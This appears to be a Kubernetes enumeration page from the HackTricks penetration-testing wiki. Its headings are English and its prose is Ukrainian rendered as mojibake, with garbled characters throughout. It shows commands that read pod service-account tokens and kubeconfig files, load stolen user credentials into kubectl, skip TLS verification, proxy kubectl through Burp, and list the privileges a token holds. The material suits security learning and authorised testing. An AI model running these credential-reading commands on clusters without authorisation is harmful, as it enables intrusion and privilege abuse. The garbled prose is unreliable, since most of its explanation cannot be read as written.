# Kubernetes Enumeration

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kubernetes Tokens

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ –º–∞—à–∏–Ω–∏, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—è–∫–æ—ó –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏ Kubernetes. –¢–æ–∫–µ–Ω –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —É —Ñ–∞–π–ª—ñ, –Ω–∞ —è–∫–∏–π –≤–∫–∞–∑—É—î **–∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ `KUBECONFIG`** –∞–±–æ **–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `~/.kube`**.

–£ —Ü—ñ–π –ø–∞–ø—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ –∑ **—Ç–æ–∫–µ–Ω–∞–º–∏ —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º–∏ –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ API —Å–µ—Ä–≤–µ—Ä–∞**. –£ —Ü—ñ–π –ø–∞–ø—Ü—ñ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–µ—à-–ø–∞–ø–∫—É –∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é, —è–∫–∞ –±—É–ª–∞ –æ—Ç—Ä–∏–º–∞–Ω–∞ —Ä–∞–Ω—ñ—à–µ.

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ–¥—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ kubernetes, —î —ñ–Ω—à—ñ –º—ñ—Å—Ü—è, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ —Ç–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –ø–æ—Ç–æ—á–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ K8:

### Service Account Tokens

–ü–µ—Ä–µ–¥ —Ç–∏–º, —è–∫ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏, —è–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ —Å–µ—Ä–≤—ñ—Å —É Kubernetes, —è –± –ø–æ—Ä–∞–¥–∏–≤ –≤–∞–º **–ø–µ—Ä–µ–π—Ç–∏ –∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º —ñ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—É Kubernetes.**

–í–∏—Ç—è–≥–Ω—É—Ç–æ –∑ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚Äú–ö–æ–ª–∏ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ –ø–æ–¥, —è–∫—â–æ –≤–∏ –Ω–µ –≤–∫–∞–∑—É—î—Ç–µ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏, –≤—ñ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è_ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º _–æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –≤ —Ç–æ–º—É –∂ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω.‚Äù_

**ServiceAccount** - —Ü–µ –æ–±'—î–∫—Ç, —è–∫–∏–º –∫–µ—Ä—É—î Kubernetes —ñ —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ –¥–ª—è –ø—Ä–æ—Ü–µ—Å—ñ–≤, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –≤ –ø–æ–¥—ñ.\
–ö–æ–∂–µ–Ω –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ –º–∞—î —Å–µ–∫—Ä–µ—Ç, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –Ω–∏–º, —ñ —Ü–µ–π —Å–µ–∫—Ä–µ—Ç –º—ñ—Å—Ç–∏—Ç—å —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É. –¶–µ JSON Web Token (JWT), –º–µ—Ç–æ–¥ –¥–ª—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –≤–∏–º–æ–≥ –º—ñ–∂ –¥–≤–æ–º–∞ —Å—Ç–æ—Ä–æ–Ω–∞–º–∏.

–ó–∞–∑–≤–∏—á–∞–π **–æ–¥–∏–Ω** –∑ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

–º—ñ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª–∏:

* **ca.crt**: –¶–µ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç ca –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π kubernetes
* **namespace**: –í—ñ–Ω –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ—Ç–æ—á–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω
* **token**: –í—ñ–Ω –º—ñ—Å—Ç–∏—Ç—å **—Ç–æ–∫–µ–Ω —Å–ª—É–∂–±–∏** –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø–æ–¥—É.

–¢–µ–ø–µ—Ä, –∫–æ–ª–∏ —É –≤–∞—Å —î —Ç–æ–∫–µ–Ω, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ API —Å–µ—Ä–≤–µ—Ä –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **`KUBECONFIG`**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏–∫–æ–Ω–∞–π—Ç–µ `(env | set) | grep -i "kuber|kube`**`"`**

–¢–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –ø—ñ–¥–ø–∏—Å—É—î—Ç—å—Å—è –∫–ª—é—á–µ–º, —â–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —É —Ñ–∞–π–ª—ñ **sa.key**, —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è **sa.pub**.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º—ñ—Å—Ü–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –Ω–∞ **Kubernetes**:

* /etc/kubernetes/pki

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º—ñ—Å—Ü–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –Ω–∞ **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**–ì–∞—Ä—è—á—ñ –ø–æ–¥–∏**_ - —Ü–µ –ø–æ–¥–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏. –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ - —Ü–µ —Ç–æ–∫–µ–Ω, —è–∫–∏–π –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å, —Ç–∞–∫–∏—Ö —è–∫ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–æ–¥—ñ–≤ —Ç–æ—â–æ.

## RBAC

–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ **RBAC**, **–ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π —Ä–æ–∑–¥—ñ–ª**.

## GUI Applications

* **k9s**: GUI, —è–∫–∏–π –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î –∫–ª–∞—Å—Ç–µ—Ä kubernetes –∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∫–æ–º–∞–Ω–¥–∏ –≤ [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). –ù–∞–ø–∏—à—ñ—Ç—å `:namespace` —ñ –≤–∏–±–µ—Ä—ñ—Ç—å –≤—Å—ñ, —â–æ–± –ø–æ—Ç—ñ–º —à—É–∫–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –≤ —É—Å—ñ—Ö –ø—Ä–æ—Å—Ç–æ—Ä–∞—Ö —ñ–º–µ–Ω.
* **k8slens**: –ü—Ä–æ–ø–æ–Ω—É—î –∫—ñ–ª—å–∫–∞ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω–∏—Ö –¥–Ω—ñ–≤ –ø—Ä–æ–±–Ω–æ–≥–æ –ø–µ—Ä—ñ–æ–¥—É: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

–©–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ K8, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∫—ñ–ª—å–∫–∞ –∑ —Ü—å–æ–≥–æ:

* **–¥—ñ–π—Å–Ω–∏–π —Ç–æ–∫–µ–Ω –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó**. –£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ –º–∏ –±–∞—á–∏–ª–∏, –¥–µ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏.
* **–∞–¥—Ä–µ—Å–∞ (**_**https://host:port**_**) API Kubernetes**. –¶–µ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —É –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —Ç–∞/–∞–±–æ —É —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó kube.
* **–ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ**: **ca.crt –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ API —Å–µ—Ä–≤–µ—Ä–∞**. –¶–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —Ç–∏—Ö –∂–µ –º—ñ—Å—Ü—è—Ö, –¥–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ API —Å–µ—Ä–≤–µ—Ä–∞, –∞–ª–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `--insecure-skip-tls-verify` –∑ `kubectl` –∞–±–æ `-k` –∑ `curl`, –≤–∞–º –Ω–µ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —Ü–µ.

–ó —Ü–∏–º–∏ –¥–µ—Ç–∞–ª—è–º–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ kubernetes**. –Ø–∫—â–æ **API** –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ **–¥–æ—Å—Ç—É–ø–Ω–∏–π** —á–µ—Ä–µ–∑ **–Ü–Ω—Ç–µ—Ä–Ω–µ—Ç**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Ç–∞ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –∑ –≤–∞—à–æ–≥–æ —Ö–æ—Å—Ç–∞.

–û–¥–Ω–∞–∫ –∑–∞–∑–≤–∏—á–∞–π **API —Å–µ—Ä–≤–µ—Ä –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ**, —Ç–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ç—É–Ω–µ–ª—å** —á–µ—Ä–µ–∑ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—É –º–∞—à–∏–Ω—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ –∑ –≤–∞—à–æ—ó –º–∞—à–∏–Ω–∏, –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`curl/wget/anything`** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∏—Ä–∏—Ö HTTP –∑–∞–ø–∏—Ç—ñ–≤ –¥–æ API —Å–µ—Ä–≤–µ—Ä–∞.

### Differences between `list` and `get` verbs

–ó **`get`** –¥–æ–∑–≤–æ–ª–∞–º–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –∞–∫—Ç–∏–≤–∏ (_–æ–ø—Ü—ñ—è `describe` –≤ `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
–Ø–∫—â–æ —É –≤–∞—Å —î **`list`** –¥–æ–∑–≤—ñ–ª, –≤–∞–º –¥–æ–∑–≤–æ–ª–µ–Ω–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ API –∑–∞–ø–∏—Ç–∏ –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É —Ç–∏–ø—É –∞–∫—Ç–∏–≤—É (_`get` –æ–ø—Ü—ñ—è –≤ `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
–Ø–∫—â–æ —É –≤–∞—Å —î **`watch`** –¥–æ–∑–≤—ñ–ª, –≤–∏ –º–∞—î—Ç–µ –ø—Ä–∞–≤–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ API –∑–∞–ø–∏—Ç–∏ –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∞–∫—Ç–∏–≤—ñ–≤:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
–í–æ–Ω–∏ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å —Å—Ç—Ä—ñ–º—ñ–Ω–≥–æ–≤–µ –∑'—î–¥–Ω–∞–Ω–Ω—è, —è–∫–µ –ø–æ–≤–µ—Ä—Ç–∞—î –≤–∞–º –ø–æ–≤–Ω–∏–π –º–∞–Ω—ñ—Ñ–µ—Å—Ç –î–µ–ø–ª–æ–π–º–µ–Ω—Ç—É —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –≤—ñ–Ω –∑–º—ñ–Ω—é—î—Ç—å—Å—è (–∞–±–æ –∫–æ–ª–∏ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–æ–≤–∏–π).

{% hint style="danger" %}
–ù–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ `kubectl` –≤–∫–∞–∑—É—é—Ç—å, —è–∫ –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç–∏. –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–∞–Ω–∏—Ö, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `describe` –∑–∞–º—ñ—Å—Ç—å `get`
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è curl

–ó—Å–µ—Ä–µ–¥–∏–Ω–∏ –ø–æ–¥—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø–æ–¥ –º–æ–∂–µ **–¥–æ—Å—Ç—É–ø–∞—Ç–∏—Å—è** –¥–æ **kube-api —Å–µ—Ä–≤–µ—Ä–∞** –∑–∞ –¥–æ–º–µ–Ω–Ω–∏–º —ñ–º'—è–º **`kubernetes.default.svc`** —ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ kube –º–µ—Ä–µ–∂—É –≤ **`/etc/resolv.config`**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç—É—Ç –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –∞–¥—Ä–µ—Å—É DNS —Å–µ—Ä–≤–µ—Ä–∞ kubernetes (".1" —Ç–æ–≥–æ –∂ –¥—ñ–∞–ø–∞–∑–æ–Ω—É —î –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é kube-api).
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è kubectl

–ú–∞—é—á–∏ —Ç–æ–∫–µ–Ω —ñ –∞–¥—Ä–µ—Å—É API —Å–µ—Ä–≤–µ—Ä–∞, –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ kubectl –∞–±–æ curl –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –Ω—å–æ–≥–æ, —è–∫ –≤–∫–∞–∑–∞–Ω–æ —Ç—É—Ç:

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, APISERVER —Å–ø—ñ–ª–∫—É—î—Ç—å—Å—è –∑–∞ —Å—Ö–µ–º–æ—é `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> —è–∫—â–æ –≤ URL –Ω–µ–º–∞—î `https://`, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É, —Å—Ö–æ–∂—É –Ω–∞ Bad Request.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π —á—ñ—Ç-–ª–∏—Å—Ç kubectl —Ç—É—Ç**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). –ú–µ—Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —Ä–æ–∑–¥—ñ–ª—ñ–≤ - –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–∏ –≤ —É–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–º—É –≤–∏–≥–ª—è–¥—ñ —Ä—ñ–∑–Ω—ñ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –¥–ª—è –ø–µ—Ä–µ—Ä–∞—Ö—É–Ω–∫—É —Ç–∞ —Ä–æ–∑—É–º—ñ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ K8s, –¥–æ —è–∫–æ–≥–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø.

–©–æ–± –∑–Ω–∞–π—Ç–∏ HTTP-–∑–∞–ø–∏—Ç, —è–∫–∏–π –Ω–∞–¥—Å–∏–ª–∞—î `kubectl`, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `-v=8`

#### MitM kubectl - –ü—Ä–æ–∫—Å—ñ—é–≤–∞–Ω–Ω—è kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### –ü–æ—Ç–æ—á–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞–ª–æ—Å—è –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–µ—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —ó—Ö –ª–æ–∫–∞–ª—å–Ω–æ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–æ–≥–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏

–ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—è –ø—Ä–æ –≤—Å—ñ —Å–µ—Ä–≤—ñ—Å–∏, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

